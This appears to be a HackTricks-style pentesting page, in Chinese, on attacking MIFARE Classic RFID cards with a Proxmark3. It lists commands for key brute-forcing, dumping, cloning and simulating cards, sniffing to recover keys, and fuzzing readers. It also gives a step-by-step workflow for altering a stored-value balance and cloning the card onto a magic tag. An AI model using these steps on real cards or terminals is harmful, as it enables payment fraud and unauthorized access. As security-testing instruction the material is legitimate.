# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## 使用 Proxmark3 攻击 RFID Systems

首先需要拥有一个 [**Proxmark3**](https://proxmark.com)，并[**安装 software 和 dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)。

### 攻击 MIFARE Classic 1KB

它包含 **16 个 sectors**，每个 sector 有 **4 个 blocks**，每个 block 包含 **16B**。UID 位于 sector 0 的 block 0 中（且无法修改）。\
要访问每个 sector，需要 **2 个 keys**（**A** 和 **B**），它们存储在每个 sector 的 **block 3** 中（sector trailer）。sector trailer 还存储 **access bits**，这些 bits 使用这 2 个 keys 为 **每个 block** 授予 **read 和 write** 权限。\
例如，如果知道第一个 key，可以获得 read 权限；如果知道第二个 key，则可以获得 write 权限。

可以执行多种攻击
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 还可以执行其他操作，例如**窃听** **Tag 到 Reader 的通信**，以尝试发现敏感数据。在这类卡中，你只需嗅探通信并计算所使用的密钥，因为使用的**cryptographic operations 很弱**，知道明文和密文后即可计算出密钥（`mfkey64` 工具）。<sup>[[3]](#references)</sup>

#### MiFare Classic 存储值滥用的快速工作流

当终端在 Classic 卡上存储余额时，典型的端到端流程如下：<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
备注

- `hf mf autopwn` orchestrates nested/darkside/HardNested-style attacks，recovers keys，并在 client dumps folder 中创建 dumps。<sup>[[1]](#references)</sup>
- 仅 magic gen1a/gen2 cards 支持写入 block 0/UID。普通 Classic cards 的 UID 只能读取。<sup>[[2]](#references)</sup>
- 许多部署使用 Classic "value blocks" 或简单校验和。编辑后，确保所有重复/互补字段及校验和保持一致。<sup>[[4]](#references)</sup>

在以下内容中查看更高层级的方法论和缓解措施：

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Commands

IoT 系统有时会使用**非品牌或非商业标签**。在这种情况下，你可以使用 Proxmark3 向**标签发送自定义 raw commands**。
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
通过这些信息，你可以尝试搜索有关该卡片以及与其通信方式的信息。Proxmark3 允许发送原始命令，例如：`hf 14a raw -p -b 7 26`

### 脚本

Proxmark3 软件预加载了一组**自动化脚本**，你可以使用它们执行简单任务。要获取完整列表，请使用 `script list` 命令。接下来，使用 `script run` 命令，后跟脚本名称：
```
proxmark3> script run mfkeys
```
你可以编写脚本来对 **tag readers** 进行 **fuzz**：复制一张 **valid card** 的数据后，只需编写一个 **Lua script**，将一个或多个随机 **bytes** 进行 **randomize**，并检查 **reader** 是否在某次迭代中崩溃。

## References

- [1] [Proxmark3 wiki：HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki：HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP 关于 MIFARE Classic Crypto1 的声明](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [KioSoft Stored Value 中的 NFC card vulnerability exploitation（SEC Consult）](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
